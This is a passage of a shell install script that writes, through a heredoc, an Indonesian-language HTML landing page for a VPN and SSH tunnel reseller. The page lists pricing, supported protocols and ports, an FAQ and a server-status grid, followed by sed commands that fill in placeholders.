  --primary-dim: rgba(0,212,255,0.15);



  --secondary: #7c3aed;



  --secondary-dim: rgba(124,58,237,0.15);



  --accent: #10b981;



  --accent-dim: rgba(16,185,129,0.15);



  --gold: #f59e0b;



  --gold-dim: rgba(245,158,11,0.15);



  --radius: 16px;



  --radius-sm: 8px;



  --shadow: 0 4px 30px rgba(0,0,0,0.3);



}



* { margin: 0; padding: 0; box-sizing: border-box; }



html { scroll-behavior: smooth; }



body {



  font-family: 'Inter', -apple-system, sans-serif;



  background: var(--bg);



  color: var(--text);



  line-height: 1.6;



  overflow-x: hidden;



}



::selection { background: var(--primary); color: var(--bg); }







/* Ambient Background */



#bg-glow {



  position: fixed;



  inset: 0;



  z-index: 0;



  pointer-events: none;



  overflow: hidden;



}



.orb {



  position: absolute;



  border-radius: 50%;



  filter: blur(80px);



  opacity: 0.3;



  animation: orbFloat 20s ease-in-out infinite;



}



.orb-1 {



  width: 600px; height: 600px;



  background: radial-gradient(circle, var(--primary), transparent);



  top: -200px; right: -100px;



  animation-delay: 0s;



}



.orb-2 {



  width: 500px; height: 500px;



  background: radial-gradient(circle, var(--secondary), transparent);



  bottom: -150px; left: -150px;



  animation-delay: -7s;



}



.orb-3 {



  width: 400px; height: 400px;



  background: radial-gradient(circle, var(--accent), transparent);



  top: 50%; left: 50%;



  transform: translate(-50%, -50%);



  animation-delay: -14s;



}



@keyframes orbFloat {



  0%, 100% { transform: translate(0, 0) scale(1); }



  25% { transform: translate(50px, -50px) scale(1.1); }



  50% { transform: translate(-30px, 30px) scale(0.9); }



  75% { transform: translate(40px, 20px) scale(1.05); }



}







/* Grid pattern overlay */



#grid-overlay {



  position: fixed;



  inset: 0;



  z-index: 0;



  pointer-events: none;



  background-image: linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),



                    linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);



  background-size: 60px 60px;



}







.container {



  position: relative;



  z-index: 1;



  max-width: 1200px;



  margin: 0 auto;



  padding: 0 24px;



}







/* Nav */



.nav {



  position: fixed;



  top: 0; left: 0; right: 0;



  z-index: 100;



  padding: 16px 0;



  backdrop-filter: blur(20px);



  -webkit-backdrop-filter: blur(20px);



  background: rgba(8,8,26,0.8);



  border-bottom: 1px solid var(--border);



  transition: all 0.3s;



}



.nav .container {



  display: flex;



  align-items: center;



  justify-content: space-between;



}



.nav-logo {



  display: flex;



  align-items: center;



  gap: 10px;



  font-size: 18px;



  font-weight: 700;



  color: var(--text-bright);



  text-decoration: none;



}



.nav-logo-icon {



  width: 36px;



  height: 36px;



  background: linear-gradient(135deg, var(--primary), var(--secondary));



  border-radius: 10px;



  display: flex;



  align-items: center;



  justify-content: center;



  font-size: 18px;



}



.nav-links {



  display: flex;



  align-items: center;



  gap: 8px;



  list-style: none;



}



.nav-links a {



  padding: 8px 16px;



  border-radius: var(--radius-sm);



  color: var(--text-dim);



  text-decoration: none;



  font-size: 14px;



  font-weight: 500;



  transition: all 0.2s;



}



.nav-links a:hover { color: var(--text); background: var(--surface); }



.nav-cta {



  padding: 8px 20px !important;



  background: linear-gradient(135deg, var(--primary), var(--secondary)) !important;



  color: var(--text-bright) !important;



  border-radius: var(--radius-sm) !important;



  font-weight: 600 !important;



}



.nav-cta:hover { opacity: 0.9; transform: translateY(-1px); }



.mobile-toggle {



  display: none;



  background: none;



  border: none;



  color: var(--text);



  font-size: 24px;



  cursor: pointer;



  padding: 8px;



}







/* Hero */



.hero {



  min-height: 100vh;



  display: flex;



  align-items: center;



  padding: 120px 0 80px;



  position: relative;



}



.hero-content {



  text-align: center;



  max-width: 800px;



  margin: 0 auto;



}



.hero-badge {



  display: inline-flex;



  align-items: center;



  gap: 8px;



  padding: 8px 16px;



  background: var(--primary-dim);



  border: 1px solid rgba(0,212,255,0.2);



  border-radius: 100px;



  font-size: 13px;



  font-weight: 500;



  color: var(--primary);



  margin-bottom: 24px;



}



.hero-badge .dot {



  width: 8px; height: 8px;



  background: var(--accent);



  border-radius: 50%;



  animation: pulse 2s infinite;



}



@keyframes pulse {



  0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(16,185,129,0.5); }



  50% { opacity: 0.7; box-shadow: 0 0 0 8px rgba(16,185,129,0); }



}



.hero h1 {



  font-size: clamp(36px, 6vw, 64px);



  font-weight: 800;



  line-height: 1.1;



  margin-bottom: 20px;



  color: var(--text-bright);



}



.hero h1 span {



  background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));



  -webkit-background-clip: text;



  -webkit-text-fill-color: transparent;



  background-clip: text;



}



.hero p {



  font-size: 18px;



  color: var(--text-dim);



  max-width: 640px;



  margin: 0 auto 32px;



  line-height: 1.7;



}



.hero-cta {



  display: flex;



  gap: 12px;



  justify-content: center;



  flex-wrap: wrap;



}



.btn {



  display: inline-flex;



  align-items: center;



  gap: 8px;



  padding: 14px 28px;



  border-radius: var(--radius-sm);



  font-size: 15px;



  font-weight: 600;



  text-decoration: none;



  cursor: pointer;



  transition: all 0.3s;



  border: none;



}



.btn-primary {



  background: linear-gradient(135deg, var(--primary), var(--secondary));



  color: #fff;



  box-shadow: 0 4px 20px rgba(0,212,255,0.3);



}



.btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,212,255,0.4); }



.btn-secondary {



  background: var(--surface);



  color: var(--text);



  border: 1px solid var(--border);



}



.btn-secondary:hover { background: var(--surface-hover); border-color: var(--border-hover); transform: translateY(-2px); }







.hero-stats {



  display: flex;



  gap: 40px;



  justify-content: center;



  margin-top: 48px;



  padding-top: 32px;



  border-top: 1px solid var(--border);



}



.hero-stat { text-align: center; }



.hero-stat-value {



  font-size: 28px;



  font-weight: 700;



  color: var(--text-bright);



  font-family: 'JetBrains Mono', monospace;



}



.hero-stat-label {



  font-size: 13px;



  color: var(--text-dim);



  margin-top: 4px;



}







/* Section */



.section {



  padding: 100px 0;



}



.section-label {



  display: inline-flex;



  align-items: center;



  gap: 8px;



  padding: 6px 14px;



  background: var(--primary-dim);



  border-radius: 100px;



  font-size: 12px;



  font-weight: 600;



  color: var(--primary);



  text-transform: uppercase;



  letter-spacing: 1px;



  margin-bottom: 16px;



}



.section-title {



  font-size: clamp(28px, 4vw, 40px);



  font-weight: 700;



  color: var(--text-bright);



  margin-bottom: 16px;



}



.section-desc {



  font-size: 16px;



  color: var(--text-dim);



  max-width: 600px;



  line-height: 1.7;



  margin-bottom: 48px;



}



.section-center {



  text-align: center;



}



.section-center .section-desc {



  margin-left: auto;



  margin-right: auto;



}







/* Pricing */



pricing-grid {



  display: grid;



  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));



  gap: 24px;



  margin-top: 40px;



}



.pricing-card {



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius);



  padding: 32px;



  transition: all 0.3s;



  position: relative;



}



.pricing-card:hover {



  transform: translateY(-4px);



  border-color: var(--border-hover);



  box-shadow: var(--shadow);



}



.pricing-card.featured {



  border-color: var(--primary);



  background: linear-gradient(180deg, var(--primary-dim), var(--surface));



}



.pricing-card.featured .pricing-badge {



  position: absolute;



  top: -12px;



  left: 50%;



  transform: translateX(-50%);



  padding: 4px 16px;



  background: linear-gradient(135deg, var(--primary), var(--secondary));



  border-radius: 100px;



  font-size: 12px;



  font-weight: 600;



  color: #fff;



}



.pricing-name {



  font-size: 20px;



  font-weight: 700;



  color: var(--text-bright);



  margin-bottom: 8px;



}



.pricing-price {



  font-size: 36px;



  font-weight: 800;



  color: var(--text-bright);



  font-family: 'JetBrains Mono', monospace;



  margin-bottom: 4px;



}



.pricing-price span {



  font-size: 16px;



  font-weight: 400;



  color: var(--text-dim);



}



.pricing-desc {



  font-size: 14px;



  color: var(--text-dim);



  margin-bottom: 24px;



}



.pricing-features {



  list-style: none;



  margin-bottom: 28px;



}



.pricing-features li {



  padding: 8px 0;



  font-size: 14px;



  color: var(--text);



  display: flex;



  align-items: center;



  gap: 10px;



}



.pricing-features li::before {



  content: "✓";



  color: var(--accent);



  font-weight: 700;



}



.pricing-btn {



  width: 100%;



  text-align: center;



  justify-content: center;



}







/* Features */



.features-grid {



  display: grid;



  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));



  gap: 20px;



}



.feature-card {



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius);



  padding: 28px;



  transition: all 0.3s;



}



.feature-card:hover {



  background: var(--surface-hover);



  border-color: var(--border-hover);



  transform: translateY(-2px);



}



.feature-icon {



  width: 48px;



  height: 48px;



  background: var(--primary-dim);



  border-radius: 12px;



  display: flex;



  align-items: center;



  justify-content: center;



  font-size: 22px;



  margin-bottom: 16px;



}



.feature-card h3 {



  font-size: 16px;



  font-weight: 600;



  color: var(--text-bright);



  margin-bottom: 8px;



}



.feature-card p {



  font-size: 14px;



  color: var(--text-dim);



  line-height: 1.6;



}







/* Protocols */



.protocols-grid {



  display: grid;



  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));



  gap: 16px;



}



.protocol-card {



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius);



  padding: 24px;



  text-align: center;



  transition: all 0.3s;



}



.protocol-card:hover {



  border-color: var(--primary);



  background: var(--primary-dim);



  transform: translateY(-2px);



}



.protocol-icon {



  font-size: 32px;



  margin-bottom: 8px;



}



.protocol-card h3 {



  font-size: 14px;



  font-weight: 600;



  color: var(--text);



}







/* Testimonials */



testimonial-grid {



  display: grid;



  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));



  gap: 20px;



}



.testimonial-card {



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius);



  padding: 28px;



}



.testimonial-stars {



  color: var(--gold);



  margin-bottom: 12px;



  font-size: 14px;



}



.testimonial-text {



  font-size: 14px;



  color: var(--text);



  line-height: 1.7;



  margin-bottom: 16px;



  font-style: italic;



}



.testimonial-author {



  display: flex;



  align-items: center;



  gap: 12px;



}



.testimonial-avatar {



  width: 40px;



  height: 40px;



  border-radius: 50%;



  background: linear-gradient(135deg, var(--primary), var(--secondary));



  display: flex;



  align-items: center;



  justify-content: center;



  font-size: 16px;



  font-weight: 700;



  color: #fff;



}



.testimonial-name {



  font-size: 14px;



  font-weight: 600;



  color: var(--text-bright);



}



.testimonial-role {



  font-size: 12px;



  color: var(--text-dim);



}







/* FAQ */



.faq-list {



  max-width: 720px;



  margin: 0 auto;



}



.faq-item {



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius-sm);



  margin-bottom: 12px;



  overflow: hidden;



  cursor: pointer;



}



.faq-question {



  padding: 20px 24px;



  font-size: 15px;



  font-weight: 600;



  color: var(--text);



  display: flex;



  justify-content: space-between;



  align-items: center;



  transition: all 0.2s;



  user-select: none;



}



.faq-question:hover { color: var(--primary); }



.faq-question::after {



  content: "+";



  font-size: 20px;



  transition: transform 0.3s;



  color: var(--text-dim);



}



.faq-item.active .faq-question::after {



  transform: rotate(45deg);



  color: var(--primary);



}



.faq-answer {



  max-height: 0;



  overflow: hidden;



  transition: max-height 0.3s ease, padding 0.3s ease;



  padding: 0 24px;



  font-size: 14px;



  color: var(--text-dim);



  line-height: 1.7;



}



.faq-item.active .faq-answer {



  max-height: 200px;



  padding: 0 24px 20px;



}







/* Contact */



.contact-grid {



  display: grid;



  grid-template-columns: 1fr 1fr;



  gap: 40px;



  align-items: start;



}



@media (max-width: 768px) {



  .contact-grid { grid-template-columns: 1fr; }



}



.contact-info h3 {



  font-size: 20px;



  font-weight: 600;



  color: var(--text-bright);



  margin-bottom: 16px;



}



.contact-info p {



  font-size: 14px;



  color: var(--text-dim);



  line-height: 1.7;



  margin-bottom: 24px;



}



.contact-links {



  display: flex;



  flex-direction: column;



  gap: 12px;



}



.contact-link {



  display: flex;



  align-items: center;



  gap: 12px;



  padding: 14px 18px;



  background: var(--surface);



  border: 1px solid var(--border);



  border-radius: var(--radius-sm);



  text-decoration: none;



  color: var(--text);



  font-size: 14px;



  transition: all 0.2s;



}



.contact-link:hover {



  background: var(--surface-hover);



  border-color: var(--border-hover);



  transform: translateX(4px);



}



.contact-link-icon {



  font-size: 20px;



  width: 32px;



  text-align: center;



}







/* Footer */



.footer {



  border-top: 1px solid var(--border);



  padding: 40px 0;



  margin-top: 40px;



}



.footer-content {



  display: flex;



  justify-content: space-between;



  align-items: center;



  flex-wrap: wrap;



  gap: 20px;



}



.footer-copy {



  font-size: 13px;



  color: var(--text-dim);



}



.footer-links {



  display: flex;



  gap: 20px;



}



.footer-links a {



  font-size: 13px;



  color: var(--text-dim);



  text-decoration: none;



  transition: color 0.2s;



}



.footer-links a:hover { color: var(--primary); }







/* Mobile */



@media (max-width: 768px) {



  .nav-links {



    display: none;



    position: absolute;



    top: 100%;



    left: 0; right: 0;



    flex-direction: column;



    padding: 16px 24px;



    background: rgba(8,8,26,0.95);



    backdrop-filter: blur(20px);



    border-bottom: 1px solid var(--border);



  }



  .nav-links.open { display: flex; }



  .mobile-toggle { display: block; }



  .hero-stats { flex-wrap: wrap; gap: 20px; }



  .pricing-card.featured { transform: none; }



}



</style>



</head>



<body>



<div id="bg-glow">



  <div class="orb orb-1"></div>



  <div class="orb orb-2"></div>



  <div class="orb orb-3"></div>



</div>



<div id="grid-overlay"></div>







<!-- Nav -->



<nav class="nav" role="navigation" aria-label="Navigasi utama">



  <div class="container">



    <a href="#" class="nav-logo">



      <div class="nav-logo-icon">&#x1F6E1;</div>



      PAGE_TITLE



    </a>



    <button class="mobile-toggle" onclick="this.nextElementSibling.classList.toggle('open')" aria-label="Toggle menu">&#9776;</button>



    <ul class="nav-links">



      <li><a href="#paket">Paket</a></li>



      <li><a href="#fitur">Fitur</a></li>



      <li><a href="#protokol">Protokol</a></li>



      <li><a href="#faq">FAQ</a></li>



      <li><a href="#kontak">Kontak</a></li>



      <li><a href="#order" class="nav-cta">Order Sekarang</a></li>



    </ul>



  </div>



</nav>







<!-- Hero -->



<section class="hero" id="home">



  <div class="container">



    <div class="hero-content">



      <div class="hero-badge">



        <span class="dot"></span>



        Server Online 24/7



      </div>



      <h1>Internet Cepat &amp; Aman<br>dengan <span>VPN Premium</span></h1>



      <p>Nikmati koneksi internet tanpa batas dengan teknologi Xray-core terbaru. Multi-protokol, anti-blokir, dan siap digunakan di semua perangkat.</p>



      <div class="hero-cta">



        <a href="#paket" class="btn btn-primary">&#x1F48E; Lihat Paket</a>



        <a href="#kontak" class="btn btn-secondary">&#x1F4AC; Hubungi Kami</a>



      </div>



      <div class="hero-stats">



        <div class="hero-stat">



          <div class="hero-stat-value">99.9%</div>



          <div class="hero-stat-label">Uptime</div>



        </div>



        <div class="hero-stat">



          <div class="hero-stat-value">5+</div>



          <div class="hero-stat-label">Protokol</div>



        </div>



        <div class="hero-stat">



          <div class="hero-stat-value">24/7</div>



          <div class="hero-stat-label">Support</div>



        </div>



        <div class="hero-stat">



          <div class="hero-stat-value">1Gbps</div>



          <div class="hero-stat-label">Speed</div>



        </div>



      </div>



    </div>



  </div>



</section>







<!-- Pricing -->



<section class="section" id="paket">



  <div class="container section-center">



    <div class="section-label">&#x1F4B0; Harga</div>



    <h2 class="section-title">Pilih Paket Sesuai Kebutuhan</h2>



    <p class="section-desc">Semua paket sudah termasuk dukungan multi-protokol, server stabil, dan garansi 24/7.</p>



  </div>



  <div class="container">



    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:24px;margin-top:40px;">



      <div class="pricing-card">



        <div class="pricing-name">&#x1F331; Starter</div>



        <div class="pricing-price">Rp25K <span>/bulan</span></div>



        <div class="pricing-desc">Cocok untuk pemula yang ingin mencoba VPN premium.</div>



        <ul class="pricing-features">



          <li>1 Akun SSH/VPN</li>



          <li>Semua Protokol</li>



          <li>Kuota 50GB</li>



          <li>Speed 100Mbps</li>



          <li>Support Standar</li>



        </ul>



        <a href="#kontak" class="btn btn-secondary pricing-btn">Pilih Paket</a>



      </div>



      <div class="pricing-card featured">



        <div class="pricing-badge">Terpopuler</div>



        <div class="pricing-name">&#x1F680; Pro</div>



        <div class="pricing-price">Rp50K <span>/bulan</span></div>



        <div class="pricing-desc">Untuk pengguna yang membutuhkan koneksi lebih stabil dan cepat.</div>



        <ul class="pricing-features">



          <li>3 Akun SSH/VPN</li>



          <li>Semua Protokol</li>



          <li>Kuota 150GB</li>



          <li>Speed 500Mbps</li>



          <li>Support Prioritas</li>



        </ul>



        <a href="#kontak" class="btn btn-primary pricing-btn">Pilih Paket</a>



      </div>



      <div class="pricing-card">



        <div class="pricing-name">&#x1F451; Enterprise</div>



        <div class="pricing-price">Rp100K <span>/bulan</span></div>



        <div class="pricing-desc">Solusi maksimal untuk power user dan tim.</div>



        <ul class="pricing-features">



          <li>5+ Akun SSH/VPN</li>



          <li>Semua Protokol</li>



          <li>Kuota Unlimited</li>



          <li>Speed 1Gbps</li>



          <li>Support VIP 24/7</li>



        </ul>



        <a href="#kontak" class="btn btn-secondary pricing-btn">Pilih Paket</a>



      </div>



    </div>



  </div>



</section>







<!-- Features -->



<section class="section" id="fitur">



  <div class="container section-center">



    <div class="section-label">&#x2728; Fitur</div>



    <h2 class="section-title">Mengapa Memilih Kami?</h2>



    <p class="section-desc">Kami menyediakan layanan VPN terbaik dengan fitur-fitur unggulan untuk kenyamanan Anda.</p>



  </div>



  <div class="container">



    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px;">



      <div class="feature-card">



        <div class="feature-icon">&#x1F6E1;</div>



        <h3>Keamanan Maksimal</h3>



        <p>Dilindungi dengan enkripsi TLS 1.3, teknologi Xray-core, dan firewall otomatis anti-DDoS.</p>



      </div>



      <div class="feature-card">



        <div class="feature-icon">&#x26A1;</div>



        <h3>Kecepatan Tinggi</h3>



        <p>Server dengan koneksi 1Gbps, optimasi TCP, dan dukungan WebSocket + gRPC untuk latency rendah.</p>



      </div>



      <div class="feature-card">



        <div class="feature-icon">&#x1F504;</div>



        <h3>Multi Protokol</h3>



        <p>Dukung SSH, VMess, VLess, Trojan dengan transport WebSocket, gRPC, dan TLS/HTTPS.</p>



      </div>



      <div class="feature-card">



        <div class="feature-icon">&#x1F4E1;</div>



        <h3>Server Stabil</h3>



        <p>Uptime 99.9% dengan monitoring otomatis, auto-restart, dan backup konfigurasi berkala.</p>



      </div>



      <div class="feature-card">



        <div class="feature-icon">&#x1F4AC;</div>



        <h3>Support 24/7</h3>



        <p>Tim support siap membantu via Telegram kapan saja. Garansi server aktif dan respons cepat.</p>



      </div>



      <div class="feature-card">



        <div class="feature-icon">&#x1F310;</div>



        <h3>Anti Blokir</h3>



        <p>Teknologi WebSocket dan HTTP CONNECT memungkinan bypass Internet Positif dengan mudah.</p>



      </div>



    </div>



  </div>



</section>







<!-- Protocols -->



<section class="section" id="protokol">



  <div class="container section-center">



    <div class="section-label">&#x1F4F6; Protokol</div>



    <h2 class="section-title">Protokol yang Didukung</h2>



    <p class="section-desc">Berbagai pilihan protokol VPN untuk menunjang kebutuhan koneksi Anda.</p>



  </div>



  <div class="container">



    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;">



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F4BB;</div>



        <h3>SSH</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">Port 22, 222</p>



      </div>



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F310;</div>



        <h3>VMess</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">WS:8080, gRPC:8444</p>



      </div>



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F30D;</div>



        <h3>VLess</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">WS:8081, gRPC:8445</p>



      </div>



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F6E1;</div>



        <h3>Trojan</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">WS:8082, gRPC:8446</p>



      </div>



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F4F6;</div>



        <h3>WebSocket</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">TLS:443, NonTLS:80</p>



      </div>



      <div class="protocol-card">



        <div class="protocol-icon">&#x1F4C8;</div>



        <h3>gRPC</h3>



        <p style="font-size:11px;color:var(--text-dim);margin-top:6px;">TLS:443, NonTLS:80</p>



      </div>



    </div>



  </div>



</section>







<!-- Testimonials -->



<section class="section" id="testimonial">



  <div class="container section-center">



    <div class="section-label">&#x2B50; Testimonial</div>



    <h2 class="section-title">Apa Kata Pelanggan</h2>



    <p class="section-desc">Pengalaman nyata dari pengguna setia Youzin Crabz Tunnel.</p>



  </div>



  <div class="container">



    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;">



      <div class="testimonial-card">



        <div class="testimonial-stars">&#9733; &#9733; &#9733; &#9733; &#9733;</div>



        <div class="testimonial-text">"Koneksi sangat stabil dan cepat. Setelah pakai sini, saya gak pindah-pindah lagi. Recommended!"</div>



        <div class="testimonial-author">



          <div class="testimonial-avatar">A</div>



          <div>



            <div class="testimonial-name">Andi Pratama</div>



            <div class="testimonial-role">Pelanggan Pro (6 bulan)</div>



          </div>



        </div>



      </div>



      <div class="testimonial-card">



        <div class="testimonial-stars">&#9733; &#9733; &#9733; &#9733; &#9733;</div>



        <div class="testimonial-text">"Supportnya fast respon banget. Ada masalah langsung dibantu. Server juga jarang down."</div>



        <div class="testimonial-author">



          <div class="testimonial-avatar">S</div>



          <div>



            <div class="testimonial-name">Siti Rahma</div>



            <div class="testimonial-role">Pelanggan Enterprise</div>



          </div>



        </div>



      </div>



      <div class="testimonial-card">



        <div class="testimonial-stars">&#9733; &#9733; &#9733; &#9733; &#9733;</div>



        <div class="testimonial-text">"Harganya worth it banget dengan kualitas yang didapat. Multi protokol bikin fleksibel."</div>



        <div class="testimonial-author">



          <div class="testimonial-avatar">R</div>



          <div>



            <div class="testimonial-name">Rudi Hermawan</div>



            <div class="testimonial-role">Pelanggan Starter</div>



          </div>



        </div>



      </div>



    </div>



  </div>



</section>







<!-- FAQ -->



<section class="section" id="faq">



  <div class="container section-center">



    <div class="section-label">&#x2753; FAQ</div>



    <h2 class="section-title">Pertanyaan Umum</h2>



    <p class="section-desc">Temukan jawaban untuk pertanyaan yang sering diajukan.</p>



  </div>



  <div class="container">



    <div class="faq-list">



      <div class="faq-item">



        <div class="faq-question">Apa itu Youzin Crabz Tunnel?</div>



        <div class="faq-answer">Layanan VPN premium berbasis Xray-core yang mendukung berbagai protokol seperti VMess, VLess, Trojan, dan SSH dengan koneksi WebSocket dan gRPC.</div>



      </div>



      <div class="faq-item">



        <div class="faq-question">Bagaimana cara melakukan order?</div>



        <div class="faq-answer">Hubungi admin melalui Telegram, pilih paket yang diinginkan, lakukan pembayaran, dan akun akan dibuat dalam waktu singkat setelah konfirmasi.</div>



      </div>



      <div class="faq-item">



        <div class="faq-question">Apakah bisa digunakan di HP dan PC?</div>



        <div class="faq-answer">Ya, layanan kami mendukung semua perangkat dan platform. Tersedia panduan konfigurasi untuk berbagai aplikasi seperti V2Ray, HTTP Custom, KPN Tunnel, dan lainnya.</div>



      </div>



      <div class="faq-item">



        <div class="faq-question">Apakah ada garansi server?</div>



        <div class="faq-answer">Kami menyediakan garansi server online 24/7 dengan monitoring otomatis. Jika ada masalah, tim support siap membantu melalui Telegram.</div>



      </div>



      <div class="faq-item">



        <div class="faq-question">Metode pembayaran apa saja?</div>



        <div class="faq-answer">Kami menerima berbagai metode pembayaran seperti transfer bank (BCA, Mandiri, BRI), e-wallet (GoPay, OVO, DANA), dan pulsa XL/Telkomsel.</div>



      </div>



    </div>



  </div>



</section>







<!-- Server Status -->



<section class="section" id="status">



  <div class="container section-center">



    <div class="section-label">&#x1F4CA; Status</div>



    <h2 class="section-title">Status Server</h2>



    <p class="section-desc">Pantau kondisi layanan kami secara real-time.</p>



  </div>



  <div class="container">



    <div class="status-grid" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;">



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F4E1;</div>



        <h3 style="font-size:13px;margin:0;">XRAY</h3>



        <div class="status-dot on" id="status-xray"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F5A5;</div>



        <h3 style="font-size:13px;margin:0;">NGINX</h3>



        <div class="status-dot on" id="status-nginx"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F4E6;</div>



        <h3 style="font-size:13px;margin:0;">HAPROXY</h3>



        <div class="status-dot on" id="status-haproxy"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F4F1;</div>



        <h3 style="font-size:13px;margin:0;">DROPBEAR</h3>



        <div class="status-dot on" id="status-dropbear"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F4BB;</div>



        <h3 style="font-size:13px;margin:0;">SSH</h3>



        <div class="status-dot on" id="status-ssh"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



      <div class="protocol-card" style="display:flex;flex-direction:column;align-items:center;gap:8px;">



        <div style="font-size:24px;">&#x1F30D;</div>



        <h3 style="font-size:13px;margin:0;">UDP CUSTOM</h3>



        <div class="status-dot on" id="status-udp"></div>



        <span style="font-size:12px;color:var(--text-dim);">Online</span>



      </div>



    </div>



  </div>



</section>







<style>



.status-dot {



  width: 12px;



  height: 12px;



  border-radius: 50%;



  display: inline-block;



}



.status-dot.on {



  background: var(--accent);



  box-shadow: 0 0 8px rgba(16,185,129,0.5);



  animation: pulse 2s infinite;



}



.status-dot.off {



  background: #ef4444;



  box-shadow: 0 0 8px rgba(239,68,68,0.5);



}



</style>







<!-- Contact -->



<section class="section" id="kontak">



  <div class="container section-center">



    <div class="section-label">&#x1F4E9; Kontak</div>



    <h2 class="section-title">Hubungi Kami</h2>



    <p class="section-desc">Silakan hubungi kami melalui kontak di bawah ini untuk order, pertanyaan, atau bantuan teknis.</p>



  </div>



  <div class="container">



    <div style="max-width:600px;margin:0 auto;">



      <div style="display:flex;flex-direction:column;gap:12px;">



        <a href="https://t.me/youzin_crabz" class="contact-link" target="_blank" rel="noopener">



          <span class="contact-link-icon">&#x2709;</span>



          <span><strong>Telegram:</strong> @youzin_crabz</span>



        </a>



        <a href="mailto:support@youzin-crabz.com" class="contact-link">



          <span class="contact-link-icon">&#x1F4E7;</span>



          <span><strong>Email:</strong> support@youzin-crabz.com</span>



        </a>



        <a href="#" class="contact-link" onclick="return false;">



          <span class="contact-link-icon">&#x1F4DE;</span>



          <span><strong>WhatsApp:</strong> +62-xxx-xxxx-xxxx</span>



        </a>



      </div>



    </div>



  </div>



</section>







<!-- Order CTA -->



<section class="section" id="order" style="padding:60px 0;">



  <div class="container section-center">



    <div style="background:linear-gradient(135deg,var(--primary-dim),var(--secondary-dim));border-radius:var(--radius);padding:48px;border:1px solid rgba(0,212,255,0.2);">



      <h2 style="font-size:28px;font-weight:700;color:var(--text-bright);margin-bottom:12px;">Siap Memulai?</h2>



      <p style="font-size:16px;color:var(--text-dim);max-width:500px;margin:0 auto 28px;">Jangan tunggu lagi! Dapatkan akses internet cepat, aman, dan tanpa batas sekarang juga.</p>



      <a href="https://t.me/youzin_crabz" class="btn btn-primary" target="_blank" rel="noopener">&#x1F4AC; Order via Telegram</a>



    </div>



  </div>



</section>







<!-- Footer -->



<footer class="footer">



  <div class="container">



    <div class="footer-content">



      <div class="footer-copy">&copy; 2026 PAGE_TITLE. All rights reserved.</div>



      <div class="footer-links">



        <a href="#home">Home</a>



        <a href="#paket">Paket</a>



        <a href="#fitur">Fitur</a>



        <a href="#faq">FAQ</a>



        <a href="#kontak">Kontak</a>



      </div>



    </div>



  </div>



</footer>







<!-- Status checker -->



<script>



// FAQ Toggle



var faqItems = document.querySelectorAll(".faq-item");



faqItems.forEach(function(item) {



  item.addEventListener("click", function() {



    this.classList.toggle("active");



  });



});







// Service status auto-refresh



function checkStatus() {



  var statusDiv = document.querySelector(".status-grid");



  if (!statusDiv) return;



  fetch('/status.json?' + new Date().getTime())



    .then(function(r) { return r.json(); })



    .then(function(data) {



      for (var key in data) {



        var el = document.getElementById('status-' + key.toLowerCase());



        if (el) {



          el.className = data[key] === 'active' ? 'status-dot on' : 'status-dot off';



          el.nextElementSibling.textContent = data[key] === 'active' ? 'Online' : 'Offline';



        }



      }



    })



    .catch(function() {});



}



setInterval(checkStatus, 30000);



checkStatus();







// Nav scroll effect



window.addEventListener("scroll", function() {



  var nav = document.querySelector(".nav");



  if (window.scrollY > 50) {



    nav.style.background = "rgba(8,8,26,0.95)";



  } else {



    nav.style.background = "rgba(8,8,26,0.8)";



  }



});







// Close mobile menu on link click



document.querySelectorAll(".nav-links a").forEach(function(link) {



  link.addEventListener("click", function() {



    document.querySelector(".nav-links").classList.remove("open");



  });



});



</script>



</body>



</html>



WEBEOF



    # Sedang untuk mengganti placeholder



    sed -i "s|PAGE_TITLE|${PAGE_TITLE}|g" "$PUBLIC_HTML/index.html"



    sed -i "s|PAGE_DESC|${PAGE_DESC}|g" "$PUBLIC_HTML/index.html"



    sed -i "s|SITE_URL|${SITE_URL}|g" "$PUBLIC_HTML/index.html"



